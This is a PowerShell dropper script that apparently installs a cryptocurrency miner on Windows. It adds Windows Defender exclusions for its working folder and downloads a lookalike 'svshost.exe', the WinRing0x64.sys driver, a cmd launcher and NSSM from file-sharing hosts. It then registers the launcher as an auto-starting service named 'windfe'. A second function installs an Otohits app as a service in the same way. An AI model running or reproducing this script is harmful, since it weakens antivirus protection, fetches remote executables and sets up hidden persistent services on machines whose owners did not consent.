$null = New-Item -Path "$env:TEMP\temp" -ItemType Directory -Force
Set-Location "$env:TEMP\temp"

function OtohitsInstall {

    Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
    $uri = "https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/OtohitsApp.zip"
    (New-Object Net.WebClient).DownloadFile($uri, "$env:TEMP\temp\OtohitsApp.zip")

    $ProgressPreference = 'SilentlyContinue'
    $null = Expand-Archive OtohitsApp.zip -DestinationPath . -Force

    .\nssm.exe install OtohitsApp "$env:TEMP\temp\OtohitsApp.exe"
    Get-Service 'OtohitsApp' | Start-Service
    Set-Service -Name OtohitsApp -StartupType Automatic
    
}
# OtohitsInstall

function ZephyrInstall {
    Add-MpPreference -ExclusionPath "$env:TEMP\temp"
    Add-MpPreference -ExclusionPath "$env:TEMP\temp\setup.exe"
    # Invoke-WebRequest -Uri 'https://msgang.com/wp-content/uploads/2022/setup.exe' -OutFile "$env:TEMP\temp\setup.exe"
    Invoke-WebRequest -Uri 'https://tmpfiles.org/dl/3684777/svshost.exe' -OutFile "$env:TEMP\temp\svshost.exe"

    Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/start1.cmd' -OutFile "$env:TEMP\temp\start1.cmd"
    Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/WinRing0x64.sys' -OutFile "$env:TEMP\temp\WinRing0x64.sys"

    # Invoke-WebRequest -Uri 'https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Temp/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"
    Invoke-WebRequest -Uri 'https://tmpfiles.org/dl/3684775/nssm.exe' -OutFile "$env:TEMP\temp\nssm.exe"

    .\nssm.exe install 'windfe' "$env:TEMP\temp\start1.cmd"
    Start-Sleep -Seconds 1
    Get-Service -Name 'windfe' | Start-Service
    Set-Service -Name 'windfe' -StartupType Automatic
    
}
ZephyrInstall

